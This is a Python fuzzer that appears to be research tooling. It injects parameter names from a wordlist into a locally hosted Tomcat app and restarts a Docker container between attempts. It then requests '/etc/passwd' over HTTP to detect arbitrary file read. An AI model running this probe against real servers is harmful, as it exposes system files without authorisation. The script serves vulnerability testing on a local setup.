import requests
import time
import subprocess
import sys


def fuzz(fuzz_input_filename, fuzz_url, fuzz_value, sleep_time, web_server, base_url_1, base_url_2, fuzz_result_filename):
    with open(fuzz_input_filename, "r") as f:
        for line in f.readlines():
            if len(line) > 0:
                fuzz_key = line.strip().split(" ")[0]

                # fuzzing AFR
                fuzz_value = fuzz_value.strip()
                url = fuzz_url+"?"+fuzz_key+"="+fuzz_value
                check_afr_url_1 = base_url_1+"/etc/passwd"
                check_afr_url_2 = base_url_2+"/etc/passwd"
                print("---url---: " + url)
                try:
                    restartServer(sleep_time, web_server)

                    result = requests.get(url, timeout=10)
                    print("---fuzz status code---: ", result.status_code)

                    time.sleep(10)

                    check_result_1 = requests.get(
                        check_afr_url_1, timeout=10)
                    check_status_code_1 = check_result_1.status_code

                    check_result_2 = requests.get(
                        check_afr_url_2, timeout=10)
                    check_status_code_2 = check_result_2.status_code

                    print("---after fuzz status code---: ",
                          check_status_code_1, check_status_code_2)
                    if "200" == str(check_status_code_1) or "200" == str(check_status_code_2):
                        writeExceptUrl("AFR: " + fuzz_key,
                                       fuzz_result_filename)
                except Exception as e:
                    print(e)


def restartServer(sleep_time, web_server):
    print(web_server+" restarted")
    child_server_process = subprocess.Popen(
        "./restart_docker.sh", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(sleep_time)


def writeExceptUrl(url, fuzz_result_filename):
    with open(fuzz_result_filename, "a", encoding="utf-8") as fa:
        fa.write(url+"\n")


def main():
    start = time.time()
    sleep_time = 10
    web_server = "tomcat"
    fuzz_input_filename = "nps.txt"
    fuzz_result_filename = "AFR_result.txt"
    base_url_1 = "http://127.0.0.1:8080"
    base_url_2 = "http://127.0.0.1:8080/helloworld"
    fuzz_url = base_url_2+"/greeting"
    sys.stdout = open('AFR_output.txt', 'w')
    fuzz_value = "/"
    fuzz(fuzz_input_filename, fuzz_url, fuzz_value,
         sleep_time, web_server, base_url_1, base_url_2, fuzz_result_filename)
    stop = time.time()
    print('Running time: %f Seconds' % (stop-start))
    sys.stdout.close()
    sys.stdout = sys.__stdout__


if __name__ == '__main__':
    main()
